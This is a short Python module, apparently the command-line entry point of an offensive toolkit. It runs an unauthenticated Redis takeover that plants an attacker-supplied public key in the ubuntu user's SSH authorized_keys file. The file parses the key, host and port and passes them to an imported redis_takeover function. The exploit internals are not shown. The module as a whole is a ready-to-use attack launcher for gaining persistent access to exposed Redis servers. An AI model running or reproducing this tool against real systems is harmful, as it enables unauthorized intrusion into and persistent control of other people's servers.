"""
Perform an unauthenticated redis takeover, planting a public key in the
ubuntu user's authorized_keys file.
"""

from appsec_wtf.exploit.redis.takeover import redis_takeover

def set_cli_opts(parser):
    """
    TODO: DOC
    """
    parser.set_defaults(func=entry)

    parser.add_argument(
        "public_key",
        help="""
        The public key to implant on the Redis host.
        """
    )

    parser.add_argument(
        "--host",
        default="localhost",
        help="""
        The host to connect to Redis on. Default is %(default)s.
        """
    )
    parser.add_argument(
        "--port",
        default=6379,
        help="""
        The port to connect to Redis on. Default is %(default)s.
        """
    )

def entry(args):
    """
    TODO: DOC
    """
    redis_takeover(args.public_key, host=args.host, port=args.port)
